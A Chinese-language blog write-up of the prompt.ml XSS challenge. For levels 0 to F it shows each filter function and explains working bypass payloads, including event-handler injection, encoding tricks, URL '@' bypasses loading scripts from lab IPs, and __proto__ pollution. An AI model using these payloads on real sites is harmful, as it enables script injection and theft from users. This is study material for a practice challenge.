---
title: prompt-xss笔记
date: 2018-10-11 09:12:00
tags: XSS
categories: XSS
---

# prompt-xss笔记

在线xss题目,用于xss学习,弹出prompt(1)就过关.

地址:http://prompt.ml

文档: https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml

我使用的是firefox浏览器,不同的浏览器有时会有些差异。

# Level 0

## Code:

```
function escape(input) {
    // warm up
    // script should be executed without user interaction
    return '<input type="text" value="' + input + '">';
} 
```

## 分析:

没有过滤,需要构造闭合。
官方文档的答案是`"><svg  onload=prompt(1)>`,利用了svg标签的onload事件，
而onload 事件会在页面或图像加载完成后立即发生。

## Solutions:

```
1. "><script>prompt(1)</script>

2. "><svg onload=prompt(1)>

3. 利用外联方式 
"><script src="http://10.60.250.250/pro.js"></script>

4. 利用onerror事件,当src寻找的资源不存在发送错误弹框。
"><img src='' onerror='prompt(1)'>

5. 利用html的字符实体和SVG。
    SVG意为可缩放矢量图形（Scalable Vector Graphics）。
    SVG 使用 XML 格式定义图像。
   "><svg><script>prompt&#x28;1&#x29;</script></svg>

6. 利用编码
	"><img src="x" onerror="&#x70;&#x72;&#x6f;&#x6d;&#x70;&#x74;&#x28;&#x31;&#x29;"
>

```

## Img:

1. `"><script>prompt(1)</script>`

![0_1](/img/xss/prompt_ml/level0_001.png)

2. `"><svg onload=prompt(1)>`
   
![0_2](/img/xss/prompt_ml/level0_002.png)

3. `"><script src="http://10.60.250.250/pro.js"></script>`
   
![0_3](/img/xss/prompt_ml/level0_003.png)

4. `"><img src='' onerror='prompt(1)'>`
   
![0_4](/img/xss/prompt_ml/level0_004.png)

5. `"><svg><script>prompt&#x28;1&#x29;</script></svg>`
   
![0_5](/img/xss/prompt_ml/level0_005.png)

6. `""><img src="x" onerror="&#x70;&#x72;&#x6f;&#x6d;&#x70;&#x74;&#x28;&#x31;&#x29;">`

![0_6](/img/xss/prompt_ml/level0_006.png)


# Level 1

## Code:

```
function escape(input) {
    // tags stripping mechanism from ExtJS library
    // Ext.util.Format.stripTags
    var stripTagsRE = /<\/?[^>]+>/gi;
    input = input.replace(stripTagsRE, '');

    return '<article>' + input + '</article>';
}        
```

## 分析:

过滤了`<>`,只要用`<>`闭合就将`<xx>`全部替换为空。

可以去掉`>`来绕过，浏览器在处理没有右尖括号的标签时有兼容性，没有`>`的标签也能生效。（注意这时候后边不能有内容)。

可以用//注释或换行分开`</article>`

官方答案是`<svg/onload=prompt(1) `,其实和`<svg onload=prompt(1) `相同。

## Solutions:

```
1. 
<img src=# onerror=prompt(1)
123 //(这里的123是为了使img生效)

2. <svg/onload=prompt(1)// (利用注释过掉</article>)
	或
	<svg onload=prompt(1)//

3. 利用onerror事件,当src寻找的资源不存在发送错误弹框。
	<img src='' onerror='prompt(1)'

```

## Img:

1. 
```
<img src=# onerror=prompt(1)
123 
```
![1_1](/img/xss/prompt_ml/level1_001.png)

2. `<svg/onload=prompt(1)//`
![1_2](/img/xss/prompt_ml/level1_002.png)

3.  `<img src='' onerror='prompt(1)'`或`<img src='' onerror='prompt(1)' /`或`<img src='' onerror='prompt(1)' //`
    
![1_3](/img/xss/prompt_ml/level1_003.png)

# Level 2

## Code:

```
function escape(input) {
    //                      v-- frowny face
    input = input.replace(/[=(]/g, '');

    // ok seriously, disallows equal signs and open parenthesis
    return input;
}           
```

## 分析:

```
过滤了`=`和`)`
尝试使用编码或其他方式绕过
```



## Solutions:

```
1.使用html编码,&#x28;或&lpar;替代(
<svg><script>prompt&#x28;1)</script>
<svg><script>prompt&lpar;1)</script>
官方答案是`<svg><script>prompt&#40;1)<b>`,缩短了字符。用的是&#40是10进制的。

2. 官方答案:
	<script>eval.call`${'prompt\x281)'}`</script>

3. 官方答案:
	<script>prompt.call`${1}`</script>

```

## Img:

1. 

`<svg><script>prompt&#x28;1)</script>`

![2_1](/img/xss/prompt_ml/level2_001.png)

2.  
``<script>eval.call`${'prompt\x281)'}`</script>``

 ![2_2](/img/xss/prompt_ml/level2_002.png)

3. ``<script>prompt.call`${1}`</script>``
     ![2_3](/img/xss/prompt_ml/level2_003.png)

# Level 3

## Code:

```
function escape(input) {
    // filter potential comment end delimiters
    input = input.replace(/->/g, '_');

    // comment the input to avoid script execution
    return '<!-- ' + input + ' -->';
}        
```

## 分析:

```
过滤了->并替换成_
但是除了-->可以闭合注释，--!>也可以。
```



## Solutions:

```
1.--!><svg/ onload=prompt(1)>

2. 官方答案:
	<script>eval.call`${'prompt\x281)'}`</script>

3. 官方答案:
	<script>prompt.call`${1}`</script>

```

## Img:

1. `--!><svg/ onload=prompt(1)>`

![3_1](/img/xss/prompt_ml/level3_001.png)

# Level 4

## Code:

```
function escape(input) {
    // make sure the script belongs to own site
    // sample script: http://prompt.ml/js/test.js
    if (/^(?:https?:)?\/\/prompt\.ml\//i.test(decodeURIComponent(input))) {
        var script = document.createElement('script');
        script.src = input;
        return script.outerHTML;
    } else {
        return 'Invalid resource.';
    }
}              
```

## 分析:

```
只能匹配http://prompt.ml/或//prompt.ml/下网址,可以利用@绕过访问从而其他域名。
这里需要把它的/用url编码%2f,@后的ip填写我php环境搭建的地址,其中的pro.js文件内
填写prompt(1)即可。
最终payload为：http://prompt.ml%2f@10.60.250.250/pro.js

```



## Solutions:

```
1.http://prompt.ml%2f@10.60.250.250/pro.js
```

## Img:

1. `http://prompt.ml%2f@10.60.250.250/pro.js`

![4_1](/img/xss/prompt_ml/level4_001.png)

# Level 5

## Code:

```
function escape(input) {
    // apply strict filter rules of level 0
    // filter ">" and event handlers
    input = input.replace(/>|on.+?=|focus/gi, '_');

    return '<input value="' + input + '" type="text">';
}     
```

## 分析:

```
将> onXXX= focus替代为了_ (其中XXX代表任意字符)
过滤>的目的是为了防止>构造闭合。
过滤onXXX=是为了过滤on开头的事件。
过滤focus是为了过滤focus事件
对于<input value="" type="text">中type和value的顺序,能够利用img
```



## Solutions:

```
1.用换行绕过onXXX=
" type='image' src=''  onerror
="prompt(1)

```

## Img:

1.

```
" type='image' src=''  onerror
="prompt(1)
```

![5_1](/img/xss/prompt_ml/level5_001.png)

# Level 6

## Code:

```
function escape(input) {
    // let's do a post redirection
    try {
        // pass in formURL#formDataJSON
        // e.g. http://httpbin.org/post#{"name":"Matt"}
        var segments = input.split('#');
        var formURL = segments[0];
        var formData = JSON.parse(segments[1]);

        var form = document.createElement('form');
        form.action = formURL;
        form.method = 'post';

        for (var i in formData) {
            var input = form.appendChild(document.createElement('input'));
            input.name = i;
            input.setAttribute('value', formData[i]);
        }

        return form.outerHTML + '                         \n\
    <script>                                                  \n\
        // forbid javascript: or vbscript: and data: stuff    \n\
        if (!/script:|data:/i.test(document.forms[0].action)) \n\
            document.forms[0].submit();                       \n\
        else                                                  \n\
            document.write("Action forbidden.")               \n\
    </script>                                                 \n\
        ';
    } catch (e) {
        return 'Invalid form data.';
    }
} 
```

## 分析:

```
以http://httpbin.org/post#{"name":"Matt"}为例
用#分成两部分http://httpbin.org/post和{"name":"Matt"}
将http://httpbin.org/post放入表单的action
{"name":"Matt"}的name放入input的name属性,value=Matt
如下：
<form action="http://httpbin.org/post" method="post"><input name="name" value="Matt"></form>
之后检查http://httpbin.org/post中是否有script:或者data:
检查到就报错,没有就提交,目的是禁止使用类似下面的javascript，vbscript和data
javascript:alert(1)//
vbscript:alert(1);
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

这一课比较抽象,看下答案`javascript:prompt(1)#{"action":1}`后做了下实验,通过将input中的name属性设action,能将

form表单中的action替换成input的。因为input的action为[object HTMLInputElement],所以

if (!/script:|data:/i.test(document.forms[0].action))就匹配不到,返回False后经过！为真,成功绕过。

![6_1](/img/xss/prompt_ml/level6_001.png)

![6_2](/img/xss/prompt_ml/level6_002.png)

## Solutions:

```
1.javascript:prompt(1)#{"action":1}

```

## Img:

1. `javascript:prompt(1)#{"action":1}`
	![6_3](/img/xss/prompt_ml/level6_003.png)

# Level 7

## Code:

```
function escape(input) {
    // pass in something like dog#cat#bird#mouse...
    var segments = input.split('#');
    return segments.map(function(title) {
        // title can only contain 12 characters
        return '<p class="comment" title="' + title.slice(0, 12) + '"></p>';
    }).join('\n');
}                 
```

## 分析:

通过split将字符串分割成数组,再通过数组的map方法能创建新的数组,新数组格式加工成了

`<p class="comment" title="最长只有12字符的内容"></p>`

slice(0,12):取前12个字符。

来张图体会一下

![7_1](/img/xss/prompt_ml/level7_001.png)

能修改的内容就是tittle处了,#来分割的新数组。

可以利用多行注释来打通,注意到一段只有12个字符,要简洁。

考虑到最短要使用到`<svg/onload=prompt(1)`的变形。

## Solutions:

1. 
`"><svg/a='#'onload='/*#*/prompt(1)'`
官方答案短一个字符...
`"><svg/a=#"onload='/*#*/prompt(1)'`

2. 利用eval函数特性执行拼接内容
`"><script>/*#*/a='prom'/*#*/+'pt(1)'/*#*/eval(a)/*#*/</script>`

3. 利用换行

```
    "><script>/*#*/prompt(/*#*/1)/*#*/</script>
    1234
```

4. ``"><script>`#${prompt(1)}#`</script>``


## Img:

1. `"><svg/a='#'onload='/*#*/prompt(1)'`

![7_2](/img/xss/prompt_ml/level7_002.png)

2. `"><script>/*#*/a='prom'/*#*/+'pt(1)'/*#*/eval(a)/*#*/</script>`

![7_3](/img/xss/prompt_ml/level7_003.png)

3. 1234是为了换行

```
"><script>/*#*/prompt(/*#*/1)/*#*/</script>
1234
```

![7_4](/img/xss/prompt_ml/level7_004.png)

4. ``"><script>`#${prompt(1)}#`</script>``

![7_5](/img/xss/prompt_ml/level7_005.png)

# Level 8

## Code:

```
function escape(input) {
    // prevent input from getting out of comment
    // strip off line-breaks and stuff
    input = input.replace(/[\r\n</"]/g, '');

    return '                                \n\
    <script>                                    \n\
        // console.log("' + input + '");        \n\
    </script> ';
    }                    
```

## 分析:

```
过滤了换行 < /,解决这题需要绕过换行。
官方给的答案是：
[U+2028]prompt(1)[U+2028]-->
这里很多人的都没成功，我在firefox下也没成功,不过chrome是可以的。
prompt(1)-->
```
[U+2028]特殊字符在这复制：https://unicode-table.com/en/#2028

<html><b>&#8232;prompt(1)&#8232;&#x2d;&#x2d;></b></html>

![8_1](/img/xss/prompt_ml/level8_001.png)

## Solutions:

仅对chrome有用,firefox不行
<html><b>&#8232;prompt(1)&#8232;&#x2d;&#x2d;></b></html>

## Img:

1.  
![8_2](/img/xss/prompt_ml/level8_002.png)

# Level 9

## Code:

```
function escape(input) {
    // filter potential start-tags
    input = input.replace(/<([a-zA-Z])/g, '<_$1');
    // use all-caps for heading
    input = input.toUpperCase();

    // sample input: you shall not pass! => YOU SHALL NOT PASS!
    return '<h1>' + input + '</h1>';
}                           
```

## 分析:

```
将<XXX 替换成<_XXX (XXX表示任意字符)
然后把小写转换成大写。
可以引用外部文件,利用js的scrpit,src和域名的大小写不敏感绕过。再利用toUpperCase()的特性，它不仅转换英文字母，也转换一些Unicode字符，比如将ſ传入就可以转换为S。
```



## Solutions:

```
1. 
<ſcript src="http://192.168.75.132/pro.js"></script>
这是我本地phpstudy下的pro.js文件,内容只有prompt(1)。
```

## Img:

![9_1](/img/xss/prompt_ml/level9_001.png)

1. `<ſcript src="http://192.168.75.132/pro.js"></script>`

![9_2](/img/xss/prompt_ml/level9_002.png)



# Level A

## Code:

```
function escape(input) {
    // (╯°□°）╯︵ ┻━┻
    input = encodeURIComponent(input).replace(/prompt/g, 'alert');
    // ┬──┬ ﻿ノ( ゜-゜ノ) chill out bro
    input = input.replace(/'/g, '');

    // (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO
    return '<script>' + input + '</script> ';
}                          
```

## 分析:

```
encodeURIComponent() 函数可把字符串作为 URI 组件进行编码。该方法不会对 ASCII 字母和数字进行编码，也不会对这些 ASCII 标点符号进行编码： - _ . ! ~ * ' ( ) 。
而接下来又将‘消除,传如promp't
```



## Solutions:

```
1. 
promp't(1)
```

## Img:

1. `promp't(1)`

![A_1](/img/xss/prompt_ml/levelA_001.png)

# Level B

## Code:

```
function escape(input) {
    // name should not contain special characters
    var memberName = input.replace(/[[|\s+*/\\<>&^:;=~!%-]/g, '');

    // data to be parsed as JSON
    var dataString = '{"action":"login","message":"Welcome back, ' + memberName + '."}';

    // directly "parse" data in script context
    return '                                \n\
    <script>                                    \n\
        var data = ' + dataString + ';          \n\
        if (data.action === "login")            \n\
            document.write(data.message)        \n\
    </script> ';
}                         

```

## 分析:

```
将以下符号消除
[ | 空白符 + * \ < > & ^ : ; = ~ ! % - 
```



## Solutions:

```
1. 测试时发现json对象的名称相同时会取最右的值,但是这里过滤了：,有什么办法绕过呢。
官方答案是:"(prompt(1))in"
in是js的关系操作符
这个会发生js错误，但是能执行prompt(1)

同样答案也可是："(prompt(1))instanceof"
```



![B_1](/img/xss/prompt_ml/levelB_001.png)

## Img:

1. `"(prompt(1))in"`

   ![B_2](/img/xss/prompt_ml/levelB_002.png)

2. `"(prompt(1))instanceof"`

   ![B_3](/img/xss/prompt_ml/levelB_003.png)



# Level C

## Code:

```
function escape(input) {
    // in Soviet Russia...
    input = encodeURIComponent(input).replace(/'/g, '');
    // table flips you!
    input = input.replace(/prompt/g, 'alert');

    // ノ┬─┬ノ ︵ ( \o°o)\
    return '<script>' + input + '</script> ';
}  
```

## 分析:

```
encodeURIComponent() 函数可把字符串作为 URI 组件进行编码。该方法不会对 ASCII 字母和数字进行编码，也不会对这些 ASCII 标点符号进行编码： - _ . ! ~ * ' ( ) 。

这里只能利用编码了
参考答案利用parseInt(字符串,基数)函数将字符串转换成整数,用指定基数表示。
parseInt("prompt",36); //1558153217
然后又用toString转化回来,用concat函数拼接编码的(1)
参考答案:
eval((1558153217).toString(36).concat(String.fromCharCode(40)).concat(1).concat(String.fromCharCode(41)))
 
```



## Solutions:

```
1.eval((1558153217).toString(36).concat(String.fromCharCode(40)).concat(1).concat(String.fromCharCode(41)))

2. 参考答案的简化版,因为没有对(1)过滤
eval((630038579).toString(30))(1)
```





## Img:

1. `eval((1558153217).toString(36).concat(String.fromCharCode(40)).concat(1).concat(String.fromCharCode(41)))`

![C_1](/img/xss/prompt_ml/levelC_001.png)

2.  `eval((630038579).toString(30))(1)`

![C_2](/img/xss/prompt_ml/levelC_002.png)



# Level D

## Code:

```
function escape(input) {
    // extend method from Underscore library
    // _.extend(destination, *sources) 
    function extend(obj) {
        var source, prop;
        for (var i = 1, length = arguments.length; i < length; i++) {
            source = arguments[i];
            for (prop in source) {
                obj[prop] = source[prop];
            }
        }
        return obj;
    }
    // a simple picture plugin
    try {
        // pass in something like {"source":"http://sandbox.prompt.ml/PROMPT.JPG"}
        var data = JSON.parse(input);
        var config = extend({
            // default image source
            source: 'http://placehold.it/350x150'
        }, JSON.parse(input));
        // forbit invalid image source
        if (/[^\w:\/.]/.test(config.source)) {
            delete config.source;
        }
        // purify the source by stripping off "
        var source = config.source.replace(/"/g, '');
        // insert the content using mustache-ish template
        return '<img src="{{source}}">'.replace('{{source}}', source);
    } catch (e) {
        return 'Invalid image data.';
    }
}        function escape(input) {
    // in Soviet Russia...
    input = encodeURIComponent(input).replace(/'/g, '');
    // table flips you!
    input = input.replace(/prompt/g, 'alert');

    // ノ┬─┬ノ ︵ ( \o°o)\
    return '<script>' + input + '</script> ';
}  
```

## 分析:

```
//input参数是这里进入的
try {
        // 举例输入的参数 {"source":"http://sandbox.prompt.ml/PROMPT.JPG"}
        //将input字符串转换成js数据
        var data = JSON.parse(input);
        获得定死的source
        var config = extend({
            // default image source
            source: 'http://placehold.it/350x150'
        }, JSON.parse(input));
        // 如果存在 字母数字下划线 / . 以外的就删除sourse 
        if (/[^\w:\/.]/.test(config.source)) {
            delete config.source;
        }
        消除 "
        var source = config.source.replace(/"/g, '');
        // 插入sourse
        return '<img src="{{source}}">'.replace('{{source}}', source);
    } catch (e) {
        return 'Invalid image data.';
    }
}  
```

这题的绕过需要`Object.prototype.__proto__`这个属性，这个属性已经不被建议用在实际代码中。

看下面的例子是如何利用的。

![D_1](/img/xss/prompt_ml/levelD_001.png)

当原来的值被删除时,可以用`__proto__`属性来赋值。可以构造形如

`{"source":"*","__proto__":{"source":""onerror=prompt(1)>"}}`来使原来的sources失效,而使用自己写入的来突破。

但是第二次过滤的时候消除了`”`，想办法找个替代双引号的方法。

这里的技巧为`String.prototype.replace()`支持特殊的`pattern`:

![D_2](/img/xss/prompt_ml/levelD_002.png)

replace中使用$`会将变量的前部插入。

在这里就是`<img src="`，借用这个虽然playad结构改变,但是绕过了`"`

## Solutions:

```
1.{"source":"*","__proto__":{"source":"$`onerror=prompt(1)>"}}
```





## Img:

1.

```
{"source":"*","__proto__":{"source":"$`onerror=prompt(1)>"}}
```

![D_3](/img/xss/prompt_ml/levelD_003.png)

# Level E

## Code:

```
function escape(input) {
    // I expect this one will have other solutions, so be creative :)
    // mspaint makes all file names in all-caps :(
    // too lazy to convert them back in lower case
    // sample input: prompt.jpg => PROMPT.JPG
    input = input.toUpperCase();
    // only allows images loaded from own host or data URI scheme
    input = input.replace(/\/\/|\w+:/g, 'data:');
    // miscellaneous filtering
    input = input.replace(/[\\&+%\s]|vbs/gi, '_');

    return '<img src="' + input + '">';
}        
```

## 分析:

```
第一层：转成大写
第二层：把// xxx:转成data(xxx表示任意字母)
第三层：过滤了\ & + % 空白符 和vbs
由于转换了大写,html的标签无法使用了,这时候考虑引用外部的js文件。
由于引用外部的js文件势必要使用到http:或http:这样的协议,所有这条路被封死了。
考虑一下data:是否能利用。

 
```

![E_1](/img/xss/prompt_ml/levelE_001.png)

因为经过大写转换,就只能利用base64编码的写法了。

`<IFRAME/SRC="data:TEXT/HTML;BASE64,PHNJCMLWDD5WCM9TCHQOMSK8L3NJCMLWDD4=">`

`PHNJCMLWDD5WCM9TCHQOMSK8L3NJCMLWDD4=`是`<script>prompt(1)</script>`经过base64编码再改大写的。

## Solutions:

```
1. "><iframe/src="data:text/html;base64,PHNjcmlwdD5wcm9tcHQoMSk8L3NjcmlwdD4=
```

## Img:

这题在环境下没有成功,但是在本地测试下是可行的。

![E_2](/img/xss/prompt_ml/levelE_002.png)

# Level F

## Code:

```
function escape(input) {
    // sort of spoiler of level 7
    input = input.replace(/\*/g, '');
    // pass in something like dog#cat#bird#mouse...
    var segments = input.split('#');

    return segments.map(function(title, index) {
        // title can only contain 15 characters
        return '<p class="comment" title="' + title.slice(0, 15) + '" data-comment=\'{"id":' + index + '}\'></p>';
    }).join('\n');
}   
```

## 分析:

这一课和Level7的很类似。解决的思路是一样的,这里最大长度为15个字符,可以使用<!--多行注释。

## Solutions:

1. 
   `"><svg><!--#--><script><!--#-->prompt(1<!--#-->)</script>`
   经过测试firfox下面也可以
   `"><svg><!--#--><script><!--#-->prompt(1<!--#-->)</`

2. 

``"><script>`#${prompt(1)}#`</script>``


3. 利用eval函数特性执行拼接内容

`"><script>/*#*/a='prom'/*#*/+'pt(1)'/*#*/eval(a)/*#*/</script>`


## Img:

1. `"><svg><!--#--><script><!--#-->prompt(1<!--#-->)</`

![F_1](/img/xss/prompt_ml/levelF_001.png)

2. ``"><script>`#${prompt(1)}#`</script>``

![F_2](/img/xss/prompt_ml/levelF_002.png)


